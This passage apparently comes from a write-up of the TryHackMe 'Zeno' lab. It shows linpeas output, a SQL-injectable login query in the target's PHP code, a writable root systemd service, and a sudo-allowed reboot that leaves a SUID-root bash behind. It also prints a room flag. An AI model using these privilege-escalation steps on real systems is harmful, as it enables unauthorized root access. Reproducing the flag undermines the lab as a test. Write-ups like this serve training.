/etc/selinux/targeted/contexts/files/file_contexts.homedirs:/home/[^/]+/public_git(/.*)?	unconfined_u:object_r:git_user_content_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/pgsql/test/regress(/.*)?	system_u:object_r:postgresql_db_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/jonas/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/postgres(ql)?(/.*)?	system_u:object_r:postgresql_db_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/sepgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
/etc/selinux/targeted/contexts/sepgsql_contexts:db_database	*			system_u:object_r:sepgsql_db_t:s0
/var/www/html/rms/aboutus.php:<title><?php echo APP_NAME ?>:About</title>
/var/www/html/rms/access-denied.php:<title><?php echo APP_NAME; ?>:Access Denied</title>
/var/www/html/rms/billing-alternative.php:<title><?php echo APP_NAME ?>:Alternative Billing</title>
/var/www/html/rms/billing-success.php:<title><?php echo APP_NAME ?>: Billing Success</title>
/var/www/html/rms/booked.php:<title><?php echo APP_NAME ?>:Registration Failed</title>
/var/www/html/rms/cart.php:<title><?php echo APP_NAME ?>:Shopping Cart</title>
/var/www/html/rms/contactus.php:<title><?php echo APP_NAME; ?>:Contacts</title>
/var/www/html/rms/foodzone.php:<title><?php echo APP_NAME; ?>:Foods</title>
/var/www/html/rms/gallery.php:<title><?php echo APP_NAME ?>:Gallery</title>
/var/www/html/rms/inbox.php:<title><?php echo APP_NAME ?>:Tables</title>
/var/www/html/rms/index.php:<title><?php echo APP_NAME; ?>:Home</title>
/var/www/html/rms/login-failed.php:<title><?php echo APP_NAME ?>:Login Failed</title>
/var/www/html/rms/login-register.php:<title><?php echo APP_NAME ?>:Login</title>
/var/www/html/rms/member-index.php:<title><?php echo APP_NAME; ?>:Member Home</title>
/var/www/html/rms/member-profile.php:<title><?php echo APP_NAME ?>:My Profile</title>
/var/www/html/rms/partyhalls.php:<title><?php echo APP_NAME ?>:Party Halls</title>
/var/www/html/rms/password-reset.php:<title><?php echo APP_NAME ?>:Password Reset</title>
/var/www/html/rms/ratings-failed.php:<title><?php echo APP_NAME ?>: Rating Failed</title>
/var/www/html/rms/ratings-success.php:<title><?php echo APP_NAME ?>: Rating Success</title>
/var/www/html/rms/ratings.php:<title><?php echo APP_NAME ?>:Rating</title>
/var/www/html/rms/register-failed.php:<title><?php echo APP_NAME ?>:Registration Failed</title>
/var/www/html/rms/register-success.php:<title><?php echo APP_NAME ?>:Registration Successful</title>
/var/www/html/rms/reserve-success.php:<title><?php echo APP_NAME ?>: Reservation Success</title>
/var/www/html/rms/reset-failed.php:<title><?php echo APP_NAME ?>:Reset Failed</title>
/var/www/html/rms/reset-success.php:<title><?php echo APP_NAME ?>:Reset Successful</title>
/var/www/html/rms/specialdeals.php:<title><?php echo APP_NAME; ?>:Specials</title>
/var/www/html/rms/tables.php:<title><?php echo APP_NAME ?>:Tables</title>

[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/libuser.conf:LU_USERNAME = %n
/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
/var/www/html/rms/admin/login-exec.php:	$qry="SELECT * FROM pizza_admin WHERE Username='$login' AND Password='$password'";
/var/www/html/rms/admin/login-failed.php:<p align="center">Please check your username and password and <a href="login-form.php">try again</a></p>

[+] Searching specific hashes inside files - less false positives (limit 70)
./linpeas.sh: line 2320: awk: command not found
```

```bash
[edward@zeno ~]$ find / -writable -name "*.service" 2>/dev/null
/etc/systemd/system/multi-user.target.wants/zeno-monitoring.service
/etc/systemd/system/zeno-monitoring.service
[edward@zeno ~]$
```

![image](https://github.com/user-attachments/assets/6a63f513-13fe-421c-bd9c-589ab733a098)

<p>THM{070cab2c9dc622e5d25c0709f6cb0510}</p>

```bash
[edward@zeno ~]$ id
id
uid=1000(edward) gid=1000(edward) groups=1000(edward) context=system_u:system_r:httpd_t:s0
[edward@zeno ~]$ ls -lah
ls -lah
total 20K
drwxr-xr-x. 3 root root   127 Sep 21  2021 .
drwxr-xr-x. 3 root root    20 Jul 26  2021 ..
lrwxrwxrwx. 1 root root     9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r--. 1 root root    18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 root root   193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 root root   231 Apr  1  2020 .bashrc
drwxr-xr-x. 2 root root    29 Sep 21  2021 .ssh
-rw-------. 1 root root   699 Jul 26  2021 .viminfo
-rw-r-----. 1 root edward  38 Jul 26  2021 user.txt
[edward@zeno ~]$ sudo -l
sudo -l
Matching Defaults entries for edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
[edward@zeno ~]$ 
```

```bash
[edward@zeno tmp]$ cat /etc/systemd/system/zeno-monitoring.service
cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=multi-user.target
[edward@zeno tmp]$ 
```

```bash

[edward@zeno home]$ cd edward
cd edward
[edward@zeno ~]$ ls -lah
ls -lah
total 964K
drwxr-xr-x. 3 root root    139 Jun 20 02:22 .
drwxr-xr-x. 3 root root     20 Jul 26  2021 ..
lrwxrwxrwx. 1 root root      9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r--. 1 root root     18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 root root    193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 root root    231 Apr  1  2020 .bashrc
drwxr-xr-x. 2 root root     29 Sep 21  2021 .ssh
-rw-------. 1 root root    699 Jul 26  2021 .viminfo
-rwsr-sr-x. 1 root root   942K Jun 20 02:22 bash
-rw-r-----. 1 root edward   38 Jul 26  2021 user.txt
[edward@zeno ~]$ ls /root
ls /root
ls: cannot open directory /root: Permission denied
[edward@zeno ~]$ sudo -u root /usr/sbin/reboot
sudo -u root /usr/sbin/reboot

Session terminated, killing shell... ...killed.
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

```bash
:~# ssh edward@zeno.thm
edward@zeno.thm's password: 
Last login: Fri Jun 20 02:23:18 2025
[edward@zeno ~]$ 

```

![image](https://github.com/user-attachments/assets/911805c8-9aa2-468b-8ee4-b039f7f41d96)


![image](https://github.com/user-attachments/assets/1963050b-d676-4b50-8d06-5b71dd6c2cb8)

<br>
<br>

![image](https://github.com/user-attachments/assets/84585277-30da-41af-b485-84fa431a57c0)

![image](https://github.com/user-attachments/assets/3f9dce73-efc7-41b7-b3f0-dff26e113181)

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 19 2025      | 409      |     193ʳᵈ    |      5ᵗʰ     |     244ᵗʰ   |     5ᵗʰ    |  109,209 |    790    |     63    |

</div>

![image](https://github.com/user-attachments/assets/2460ef70-3cd7-4ccd-91d0-3d2459ad0eb0)

![image](https://github.com/user-attachments/assets/4aa00808-380c-4585-8b58-75f0ab9e7e2f)

![image](https://github.com/user-attachments/assets/52b0ade3-a21b-4c9a-a4fa-8ab21ab317ec)

![image](https://github.com/user-attachments/assets/77419cfb-d25c-4bfd-bb48-120086e22b3d)

![image](https://github.com/user-attachments/assets/6f09cdba-f3a2-4fe3-aff5-2e72e5d3e811)
